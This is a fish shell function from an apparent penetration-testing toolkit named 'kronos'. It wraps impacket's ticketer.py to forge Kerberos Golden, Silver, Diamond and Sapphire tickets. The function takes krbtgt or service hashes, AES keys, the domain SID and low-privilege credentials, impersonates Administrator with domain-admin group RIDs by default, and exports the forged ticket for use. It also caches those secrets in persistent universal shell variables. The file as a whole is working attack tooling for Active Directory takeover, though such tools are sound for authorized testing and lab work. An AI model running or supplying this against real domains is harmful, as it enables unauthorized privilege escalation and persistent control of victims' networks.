# description: Create Golden, Silver, Diamond, and Sapphire Tickets (Interactive & Flags)
function __kronos_ticket --description "Create Golden, Silver, Diamond, and Sapphire Tickets using ticketer.py"
    set -l subaction $argv[1]
    set -l wizard 0
    if contains -- "$subaction" golden silver diamond sapphire
        set wizard 1
        set -e argv[1]
    end

    argparse h/help u/user= d/domain= S/sid= H/hash= s/spn= I/user-id= G/groups= A/auth-user= P/auth-pass= L/auth-hash= K/aes-key= -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos ticket [golden|silver|diamond|sapphire] [OPTIONS]"
        echo ""
        echo "Create Golden, Silver, Diamond, or Sapphire tickets using impacket's ticketer.py."
        echo "If a subcommand is specified without all required flags,"
        echo "an interactive wizard will guide you through the process."
        echo ""
        echo "Common Options:"
        echo "  -u, --user USER       User to impersonate (default: Administrator)"
        echo "  -d, --domain DOMAIN   Target domain FQDN (falls back to \$TGT_DC_DOMAIN)"
        echo "  -S, --sid SID         Domain SID"
        echo "  -H, --hash HASH       krbtgt NTLM hash (Golden/Diamond/Sapphire) or service hash (Silver)"
        echo ""
        echo "Silver Ticket Options:"
        echo "  -s, --spn SPN         Target SPN (e.g., cifs/dc.domain.com)"
        echo ""
        echo "Diamond/Sapphire Ticket Options:"
        echo "  -A, --auth-user USER  Low-priv user for authentication"
        echo "  -P, --auth-pass PASS  Low-priv password for authentication"
        echo "  -L, --auth-hash HASH  Low-priv NTLM hash for authentication"
        echo "  -I, --user-id RID     User RID (default: 500)"
        echo ""
        echo "Sapphire Ticket ONLY Options:"
        echo "  -K, --aes-key KEY     krbtgt AES256 key (Mandatory for Sapphire)"
        echo ""
        echo "Diamond Ticket ONLY Options:"
        echo "  -G, --groups RIDS     Comma-separated group RIDs (default: 512,513,518,519,520)"
        echo ""
        echo "  -h, --help            Show this help message"
        return 0
    end

    # Capture flags first
    set -l domain $_flag_domain
    set -l user $_flag_user
    set -l sid $_flag_sid
    set -l hash $_flag_hash
    set -l spn $_flag_spn
    set -l user_id $_flag_user_id
    set -l groups $_flag_groups
    set -l auth_user $_flag_auth_user
    set -l auth_pass $_flag_auth_pass
    set -l auth_hash $_flag_auth_hash
    set -l aes_key $_flag_aes_key

    if test "$wizard" -eq 1
        set_color cyan; echo "[*] Starting $subaction ticket wizard..."; set_color normal
        
        # 1. krbtgt/service hash
        set -l hash_label "krbtgt NTLM Hash"
        if test "$subaction" = "silver"; set hash_label "Service NTLM Hash"; end
        set -l def_hash "$__KRONOS_CACHE_HASH"
        if test -z "$def_hash"; set def_hash "$TGT_CRED_PASSWORD"; end
        if test -n "$hash"; set def_hash "$hash"; end
        set hash (__kronos_ask "$hash_label" "$def_hash"); or return 1
        set -U __KRONOS_CACHE_HASH "$hash"

        # 2. AES Key (Sapphire only)
        if test "$subaction" = "sapphire"
            set -l def_aes "$__KRONOS_CACHE_AES_KEY"
            if test -n "$aes_key"; set def_aes "$aes_key"; end
            set aes_key (__kronos_ask "krbtgt AES256 Key" "$def_aes"); or return 1
            set -U __KRONOS_CACHE_AES_KEY "$aes_key"
        end

        # 3. Domain SID
        set -l def_sid "$__KRONOS_CACHE_SID"
        if test -n "$sid"; set def_sid "$sid"; end
        set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1
        set -U __KRONOS_CACHE_SID "$sid"

        # 4. Domain FQDN
        set -l def_domain "$__KRONOS_CACHE_DOMAIN"
        if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; end
        if test -n "$domain"; set def_domain "$domain"; end
        set domain (__kronos_ask "Domain FQDN" "$def_domain"); or return 1
        set -U __KRONOS_CACHE_DOMAIN "$domain"

        # 5. User to impersonate
        set -l def_user "$__KRONOS_CACHE_USER"
        if test -z "$def_user"; set def_user "Administrator"; end
        if test -n "$user"; set def_user "$user"; end
        set user (__kronos_ask "User to impersonate" "$def_user"); or return 1
        set -U __KRONOS_CACHE_USER "$user"
        
        # 6. Auth User & Pass/Hash (Diamond/Sapphire)
        if test "$subaction" = "diamond" -o "$subaction" = "sapphire"
            set -l def_auth_user "$__KRONOS_CACHE_AUTH_USER"
            if test -z "$def_auth_user"; set def_auth_user "$TGT_CRED_USERNAME"; end
            if test -n "$auth_user"; set def_auth_user "$auth_user"; end
            set auth_user (__kronos_ask "Authentication User (Low-priv)" "$def_auth_user"); or return 1
            set -U __KRONOS_CACHE_AUTH_USER "$auth_user"

            set -l def_auth_val "$__KRONOS_CACHE_AUTH_VAL"
            if test -n "$auth_pass"; set def_auth_val "$auth_pass"; end
            if test -n "$auth_hash"; set def_auth_val "$auth_hash"; end
            set -l auth_input (__kronos_ask "Authentication Password or Hash" "$def_auth_val"); or return 1
            set -U __KRONOS_CACHE_AUTH_VAL "$auth_input"
            
            # Auto-detect if input is a hash
            if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
                set auth_hash "$auth_input"
                set auth_pass ""
            else
                set auth_pass "$auth_input"
                set auth_hash ""
            end

            # 7. User ID (RID)
            set -l def_user_id "$__KRONOS_CACHE_USER_ID"
            if test -z "$def_user_id"; set def_user_id "500"; end
            if test -n "$user_id"; set def_user_id "$user_id"; end
            set user_id (__kronos_ask "Target User RID" "$def_user_id"); or return 1
            set -U __KRONOS_CACHE_USER_ID "$user_id"

            if test "$subaction" = "diamond"
                set -l def_groups "$__KRONOS_CACHE_GROUPS"
                if test -z "$def_groups"; set def_groups "512,513,518,519,520"; end
                if test -n "$groups"; set def_groups "$groups"; end
                set groups (__kronos_ask "Group RIDs (comma-separated)" "$def_groups"); or return 1
                set -U __KRONOS_CACHE_GROUPS "$groups"
            end
        end

        # 8. SPN (Silver only)
        if test "$subaction" = "silver"
            set -l def_spn "$__KRONOS_CACHE_SPN"
            if test -n "$spn"; set def_spn "$spn"; end
            set spn (__kronos_ask "Target SPN (e.g. cifs/dc01.dante.local)" "$def_spn"); or return 1
            set -U __KRONOS_CACHE_SPN "$spn"
        end
    else
        # Non-wizard fallbacks
        if test -z "$domain"; set domain "$TGT_DC_DOMAIN"; end
        if test -z "$user"; set user "Administrator"; end
        if test "$subaction" = "diamond"; and test -z "$user_id"; set user_id "500"; end
    end

    # Final Validation
    if test -z "$domain"; echo "error: domain is required"; return 1; end
    if test -z "$sid"; echo "error: domain SID is required"; return 1; end
    if test -z "$hash"; echo "error: hash is required"; return 1; end
    if test "$subaction" = "sapphire" -a -z "$aes_key"; echo "error: AES Key is required for sapphire tickets"; return 1; end
    if test "$subaction" = "silver" -a -z "$spn"; echo "error: SPN is required for silver tickets"; return 1; end
    if test "$subaction" = "diamond" -o "$subaction" = "sapphire"
        if test -z "$auth_user"; echo "error: auth-user is required"; return 1; end
        if test -z "$auth_pass" -a -z "$auth_hash"; echo "error: auth password or hash is required"; return 1; end
    end

    set -l impacket_cmd ""
    if command -v ticketer.py >/dev/null; set impacket_cmd ticketer.py
    else if command -v impacket-ticketer >/dev/null; set impacket_cmd impacket-ticketer
    else; echo "error: ticketer not found. run 'kronos install'."; return 1; end

    set -l ticket_args -nthash "$hash" -domain-sid "$sid" -domain "$domain"
    
    switch "$subaction"
        case silver
            set -a ticket_args -spn "$spn"
            echo "[*] Forging Silver Ticket for $user via $impacket_cmd..."
        case diamond
            set -a ticket_args -request -user "$auth_user" -user-id "$user_id" -groups "$groups"
            if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash"
            else; set -a ticket_args -password "$auth_pass"; end
            echo "[*] Forging Diamond Ticket for $user via $impacket_cmd..."
        case sapphire
            set -a ticket_args -request -user "$auth_user" -aesKey "$aes_key" -user-id "$user_id" -impersonate "$user"
            if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash"
            else; set -a ticket_args -password "$auth_pass"; end
            echo "[*] Forging Sapphire Ticket for $user via $impacket_cmd..."
        case golden '*'
            echo "[*] Forging Golden Ticket for $user via $impacket_cmd..."
    end
    
    set -a ticket_args "$user"
    command $impacket_cmd $ticket_args
    
    if test -f "$user.ccache"
        set -gx KRB5CCNAME "$PWD/$user.ccache"
        echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
    end
end
